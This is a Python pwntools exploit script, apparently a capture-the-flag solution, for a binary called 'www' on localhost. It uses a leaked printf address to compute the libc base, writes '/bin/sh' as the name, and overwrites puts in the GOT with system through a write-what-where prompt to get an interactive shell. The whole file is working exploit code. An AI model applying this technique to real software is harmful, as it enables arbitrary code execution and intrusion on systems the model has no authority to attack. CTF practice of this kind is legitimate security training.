#!/usr/bin/env python3
from pwn import *

elf = ELF("./www")
remote_libc = ELF("./libc-2.27.so")

HOST, PORT = "localhost", 1339

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

def main():
    global io, libc
    io = conn()

    io.recvuntil("You might need this: ")
    leak = int(io.recvline(), 16)
    log.info(f"libc leak (printf): 0x{leak:x}")
    libc.address = leak - libc.sym.printf
    log.success(f"libc base: 0x{libc.address:x}")

    io.sendafter("Enter your name: ", b"/bin/sh\x00")

    address = elf.got.puts
    value = libc.sym.system
    io.sendlineafter("Where? ", f"{address}")
    io.sendlineafter("What? ", f"{value}")

    io.interactive()

def conn():
    global libc
    gdbscript = '''
    '''
    if args.REMOTE:
        libc = remote_libc
        p = remote(HOST, PORT)
    elif args.GDB:
        libc = elf.libc
        p = gdb.debug(elf.path, gdbscript=gdbscript)
    else:
        libc = elf.libc
        p = process(elf.path)

    return p

if __name__ == "__main__":
    io = None
    libc = None
    try:
        main()
    finally:
        if io:
            io.close()
